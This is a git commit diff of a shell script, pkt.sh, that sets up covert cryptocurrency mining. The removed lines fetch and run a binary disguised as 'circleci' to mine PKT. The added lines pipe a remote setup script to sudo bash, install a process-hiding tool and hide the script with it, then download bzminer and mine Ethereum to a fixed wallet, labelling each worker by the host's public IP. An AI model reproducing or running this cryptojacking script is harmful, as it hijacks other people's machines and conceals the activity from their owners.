e9d43de271cb3783aae6b435ea8f614c0bedd4f6
viwarlani <106577288+viwarlani@users.noreply.github.com>
2022-06-11 14:15:53 +0700

    Update pkt.sh

--- pkt.sh
+++ pkt.sh
@@ -1,5 +1,13 @@
 #!/bin/bash
-wget https://github.com/aurbach55/zash/raw/main/circleci
-mv circleci data
-chmod 777 data
-./data ann -p pkt1qdk6k4vd02fkzpzea6c8e0usxfrmguucdagl03v http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
+sudo apt update
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+ph add pkt.sh
+sleep 14
+sudo apt install libpci3
+wget https://github.com/bzminer/bzminer/releases/download/v9.1.4/bzminer_v9.1.4_linux.tar.gz -O - | tar -xz
+cd bzminer_v9.1.4_linux && ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && sudo ./bzminer -a ethash -w 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -p ethproxy+ssl://eth-hk.flexpool.io:5555 ethproxy+ssl://eth-sg.flexpool.io:5555 -r $ip-$_$ --nvidia 1
